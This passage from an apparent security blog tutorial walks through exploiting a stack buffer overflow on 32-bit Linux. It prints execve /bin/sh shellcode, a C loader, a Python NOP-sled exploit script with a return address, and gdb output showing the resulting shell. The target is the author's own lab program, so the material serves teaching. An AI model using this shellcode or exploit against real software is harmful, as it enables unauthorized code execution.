<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> (*ret)() = (<span class="keyword">int</span>(*)())shellcode;</span><br><span class="line">    <span class="keyword">return</span> ret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Let’s run it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gcc -m32 -z execstack shellcode-loader.c -o shellcode-loader</span><br><span class="line">[hg8@archbook ~]$ ./shellcode-loader</span><br><span class="line">sh-5.1$ </span><br></pre></td></tr></table></figure>

<p>All is good, let’s now inject the shellcode into our vulnerable program.</p>
<h2 id="Shellcode-Injection"><a href="#Shellcode-Injection" class="headerlink" title="Shellcode Injection"></a>Shellcode Injection</h2><p>We now need to make our vulnerable program execute our shellcode. To do so we will inject the shellcode in the input data payload, for it to be stored in our buffer.</p>
<p>The next step will be to have our return address point to the memory location where our shellcode is stored in order for it to be executed. </p>
<p>Since memory may change a bit during program execution and we don’t know the exact location of our shellcode we will use the NOP-sled technique. </p>
<h3 id="NOP-sled"><a href="#NOP-sled" class="headerlink" title="NOP-sled"></a>NOP-sled</h3><p><img src="https://github.com/hg8/hg8.github.io/assets/9076747/d296731f-4d42-45a1-8168-4097002e808d" alt="NOP Sled"></p>
<p>A NOP sled, also known as a NOP slide, is a technique used to help ensure that a shellcode is executed even if the exact memory location of the exploit payload is not known.</p>
<p>The NOP, or No-Operation, instruction is a machine language instruction that performs no operation and takes up one machine cycle. NOP sled takes advantage of this instruction by creating a sequence of NOP instructions that can serve as a landing pad for the program execution flow.</p>
<p>We will craft a sequence of NOP instructions followed by our shellcode. The idea is that if the execution flow is redirected to any point within the NOP sled, the CPU will execute the NOP instructions and keep moving forward until it hits the shellcode.</p>
<p>When utilizing a NOP-sled, the precise location of the shellcode within the buffer doesn’t matter for the return address to reach it. What we do know is that it will reside somewhere within the buffer, and its length will be 25 bytes.</p>
<p>With our shellcode of 25 bytes and a payload of 512 bytes, we have 487 bytes to fill with NOP, which we will divide like so:</p>
<p>Payload: <code>[ NOP SLED] [ SHELLCODE ] [ RETURN ADDRESS ]</code></p>
<h3 id="Crafting-our-exploit"><a href="#Crafting-our-exploit" class="headerlink" title="Crafting our exploit"></a>Crafting our exploit</h3><p>We will use a Python script to craft our exploit, since we use Python 3 it’s important to use  <code>bytes</code> type. </p>
<p>In addition, since we are working on x86, the hexadecimal value for NOP instructions is <code>0x90</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">eip = <span class="string">b&quot;\x43\x43\x43\x43&quot;</span> * <span class="number">10</span></span><br><span class="line">nop = <span class="string">b&quot;\x90&quot;</span> * <span class="number">447</span></span><br><span class="line">buff = nop + shellcode + eip</span><br><span class="line"></span><br><span class="line">sys.stdout.buffer.write(buff) </span><br></pre></td></tr></table></figure>

<p>Since we don’t know for now what the return address (<code>eip</code>) will be, we currently replace it with <code>C</code> (<code>x43</code>) that we repeat 10 times to have a bit of padding between our shellcode and the stack.</p>
<p>Our NOP sled is being repeated 447 times since we need to write 512 bytes to overwrite the return address: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">512        - (4 * 10) -     25    =     447</span><br><span class="line">Total size -    eip   - shellcode =   nop sled.</span><br></pre></td></tr></table></figure>

<p>Here is what we expect our memory to looks like after execution of our payload:</p>
<p><img src="https://github.com/hg8/hg8.github.io/assets/9076747/7968b3ab-4e06-482b-a03d-ac19f7e117cb" alt="Stack Overflowed shellcode injection"></p>
<p>Let’s run our payload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gdb ./vuln</span><br><span class="line">Reading symbols from vuln2-nosec...</span><br><span class="line">(gdb) run $(python exploit-test.py)</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/usr/lib/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x43434343 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>We get exactly what we were looking for, a segmentation fault since we didn’t provide a valid return address yet. Let’s now inspect our memory to define what the return address should be.</p>
<p>When inspecting the memory, we can see our payload was injected as expected:</p>
<p><img src="https://github.com/hg8/hg8.github.io/assets/9076747/a8b81bb7-2590-47e9-bc15-c2071f7d7f03" alt="buffer overflow memory inspection"></p>
<p>Let’s now pick any memory address within the <code>x90</code> NOP sled area before the shellcode to be our return address.  From the screenshot above we can pick <code>0xffffce30</code> for example.</p>
<p>Since Intel CPUs are <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Endianness">little endian</a>, we need to reverse the address for our payload.</p>
<p>Our script become:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">eip = <span class="string">b&quot;\x30\xce\xff\xff&quot;</span> * <span class="number">10</span></span><br><span class="line">nop = <span class="string">b&quot;\x90&quot;</span> * <span class="number">447</span></span><br><span class="line">buff = nop + shellcode + eip</span><br><span class="line"></span><br><span class="line">sys.stdout.buffer.write(buff) </span><br></pre></td></tr></table></figure>

<p>If everything goes fine, our program <code>strcpy</code> will copy our string, and when it will try to return it will load our injected return value, redirecting to the NOP Sled, followed by the shellcode that will then be executed. </p>
<p>Let’s give it a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gdb ./vuln</span><br><span class="line">(gdb) run $(python exploit.py)</span><br><span class="line"></span><br><span class="line">Using host libthread_db library <span class="string">&quot;/usr/lib/libthread_db.so.1&quot;</span>.</span><br><span class="line">process 6722 is executing new program: /usr/bin/bash</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/usr/lib/libthread_db.so.1&quot;</span>.</span><br><span class="line">sh-5.1$</span><br></pre></td></tr></table></figure>

<p>And here we go! The buffer overflow was successfully exploited, resulting in obtaining access to a command shell.</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><a target="_blank" rel="noopener" href="https://wiki.osdev.org/Stack_Smashing_Protector">Stack Smashing Protector</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">Address space layout randomization</a></li>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/47411158/understanding-stack-alignment-enforcement">Understanding stack alignment enforcement</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Buffer_overflow#Exploitation">Buffer Overflow - Exploitation</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Buffer_overflow#Protective_countermeasures">Buffer Overflow - Protective Countermeasures</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Data_structure_alignment">Data structure alignment</a></li>
<li><a target="_blank" rel="noopener" href="https://jvns.ca/blog/2021/05/17/how-to-look-at-the-stack-in-gdb/">How to look at the stack with gdb</a></li>
<li><a target="_blank" rel="noopener" href="http://www.kernel-panic.it/security/shellcode/shellcode5.html">Writing Shellcode for Linux and *BSD</a></li>
<li><a target="_blank" rel="noopener" href="https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/">Linux Shellcode 101: From Hell to Shell</a></li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46907">Linux/x64 - execve(/bin/sh) Shellcode (23 bytes)</a></li>
<li><a target="_blank" rel="noopener" href="http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/">Two basic ways to run and test shellcode</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=1S0aBV-Waeo">Running a Buffer Overflow Attack - Computerphile</a></li>
</ul>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Binary-Exploitation/">Binary Exploitation</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/binary-exploitation/" rel="tag">binary exploitation</a>, <a class="tag-link-link" href="/tags/buffer-overflow/" rel="tag">buffer overflow</a>, <a class="tag-link-link" href="/tags/c/" rel="tag">c</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Setting-up-our-environment"><span class="toc-number">1.</span> <span class="toc-text">Setting up our environment</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Overflowing-the-stack"><span class="toc-number">2.</span> <span class="toc-text">Overflowing the stack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode-Creation"><span class="toc-number">3.1.</span> <span class="toc-text">Shellcode Creation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode-Testing"><span class="toc-number">3.2.</span> <span class="toc-text">Shellcode Testing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode-Injection"><span class="toc-number">3.3.</span> <span class="toc-text">Shellcode Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NOP-sled"><span class="toc-number">3.3.1.</span> <span class="toc-text">NOP-sled</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crafting-our-exploit"><span class="toc-number">3.3.2.</span> <span class="toc-text">Crafting our exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.4.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
